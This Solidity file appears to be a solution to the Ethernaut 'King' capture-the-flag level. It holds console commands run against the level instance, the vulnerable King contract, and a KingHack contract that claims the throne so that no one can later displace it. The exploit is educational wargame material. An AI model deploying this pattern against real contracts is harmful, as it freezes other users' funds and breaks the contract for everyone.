// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Some console commands:
// await getBalance('0x6Ab66292cc6304F6B04aa7C477Efdf9851b78F04')
// '0.001'
// await contract._king()
// '0x3049C00639E6dfC269ED1451764a046f7aE500c6'
// '0x3049C00639E6dfC269ED1451764a046f7aE500c6' - is the address of the level - so king is currently level address with 0.001 eth
// Now send some ether from my address:
//  await contract.send(2000000000000000)
// await getBalance('0x6Ab66292cc6304F6B04aa7C477Efdf9851b78F04')
// '0.001'
// This is still the same - but the prize is increased
// Number(await web3.eth.getStorageAt('0x6Ab66292cc6304F6B04aa7C477Efdf9851b78F04',1))
// 2000000000000000
// King is changed:
// await contract._king()
// '0xfd83797371a1002569Fc549487523DBEF0481ae5'

contract KingHack {
    
    constructor (address payable kingContractAddress) payable {
      uint newPrize = King(kingContractAddress).prize();
      (bool success,) = payable(kingContractAddress).call{value: newPrize}("");
      require(success, "Sending to KingContract was not successful");
    }

    // fallback() external payable {
    //   //Revert anything that will be sent to this contract
    //   revert();
    // }
}


contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}